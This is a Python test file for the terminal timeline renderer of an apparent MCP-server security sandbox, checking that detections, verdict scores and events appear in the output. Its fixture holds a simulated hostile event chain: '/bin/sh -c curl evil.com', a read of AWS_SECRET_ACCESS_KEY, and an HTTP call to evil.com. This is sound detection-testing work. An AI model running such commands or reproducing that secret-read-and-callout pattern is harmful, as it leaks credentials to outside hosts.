"""Tests for the Rich terminal timeline renderer.

Rendering with `force_terminal=False, color_system=None` so the output
is plain text we can grep deterministically.
"""

from nyuwaymcpsandbox.detection.engine import Finding
from nyuwaymcpsandbox.detection.verdict import calculate_verdict
from nyuwaymcpsandbox.output.report import Report
from nyuwaymcpsandbox.output.timeline_view import render_timeline
from nyuwaymcpsandbox.sandbox.events import (
    EVT_CONTAINER_STARTED,
    EVT_ENV_READ,
    EVT_NETWORK_HTTP,
    EVT_PROCESS_SPAWN,
    SRC_CONTAINER,
    SRC_ENV,
    SRC_NETWORK,
    SRC_PROCESS,
    BehavioralEvent,
)
from nyuwaymcpsandbox.sandbox.timeline import BehavioralTimeline


def _build_report_with_findings():
    tl = BehavioralTimeline()
    container = BehavioralEvent(type=EVT_CONTAINER_STARTED, source=SRC_CONTAINER, timestamp=0.1)
    spawn = BehavioralEvent(
        type=EVT_PROCESS_SPAWN,
        source=SRC_PROCESS,
        timestamp=1.0,
        payload={"argv": ["/bin/sh", "-c", "curl evil.com"]},
    )
    env = BehavioralEvent(
        type=EVT_ENV_READ,
        source=SRC_ENV,
        timestamp=2.0,
        payload={"name": "AWS_SECRET_ACCESS_KEY"},
    )
    http = BehavioralEvent(
        type=EVT_NETWORK_HTTP, source=SRC_NETWORK, timestamp=3.0, payload={"host": "evil.com"}
    )
    tl.add(container)
    tl.add(spawn)
    tl.add(env)
    tl.add(http)

    findings = [
        Finding(
            rule_id="shell_exec_in_tool",
            title="Subprocess spawned during MCP tool execution",
            severity="high",
            weight=25,
            category="code_execution",
            description="d",
            recommendation="r",
            matched_event_ids=[spawn.event_id],
        ),
        Finding(
            rule_id="credential_env_access",
            title="Tool handler read a credential environment variable",
            severity="medium",
            weight=15,
            category="credential_access",
            description="d",
            recommendation="r",
            matched_event_ids=[env.event_id],
        ),
    ]
    verdict = calculate_verdict(findings)
    return Report(
        target="github:demo/server",
        mode="fast",
        timeline=tl,
        findings=findings,
        verdict=verdict,
        duration_seconds=4.5,
    )


def test_render_includes_header_target_and_mode():
    out = render_timeline(_build_report_with_findings())
    assert "github:demo/server" in out
    assert "fast" in out
    assert "nyuwaymcpsandbox" in out


def test_render_includes_verdict_score():
    out = render_timeline(_build_report_with_findings())
    # Two findings: 25 + 15 = 40 (MEDIUM)
    assert "score 40/100" in out
    assert "MEDIUM" in out


def test_render_includes_every_event_description():
    out = render_timeline(_build_report_with_findings())
    assert "Container started" in out
    assert "/bin/sh" in out
    assert "AWS_SECRET_ACCESS_KEY" in out
    assert "evil.com" in out


def test_render_marks_matched_events_with_detection_tag():
    out = render_timeline(_build_report_with_findings())
    assert "DETECTION" in out
    assert "shell_exec_in_tool" in out
    assert "credential_env_access" in out


def test_render_includes_detections_section():
    out = render_timeline(_build_report_with_findings())
    assert "Detections" in out
    # Severity tags shown
    assert "HIGH" in out
    assert "MEDIUM" in out


def test_render_includes_recommendation_panel():
    out = render_timeline(_build_report_with_findings())
    assert "Recommendation" in out


def test_render_clean_report_no_detections_section():
    """A clean run shouldn't show an empty Detections table."""
    tl = BehavioralTimeline()
    tl.add(BehavioralEvent(type=EVT_CONTAINER_STARTED, source=SRC_CONTAINER, timestamp=0.1))
    verdict = calculate_verdict([])
    report = Report(target="./x", mode="fast", timeline=tl, findings=[], verdict=verdict)
    out = render_timeline(report)
    assert "Container started" in out
    # The Detections heading must not appear when there are zero findings.
    assert "Detections (0)" not in out
    assert "PASS" in out


def test_render_ascii_fallback_when_unicode_false():
    out = render_timeline(_build_report_with_findings(), unicode=False)
    # No unicode glyphs in ASCII mode.
    assert "✓" not in out
    assert "✗" not in out
    assert "⚠" not in out


def test_render_returns_non_empty_string():
    out = render_timeline(_build_report_with_findings())
    assert isinstance(out, str)
    assert len(out) > 100
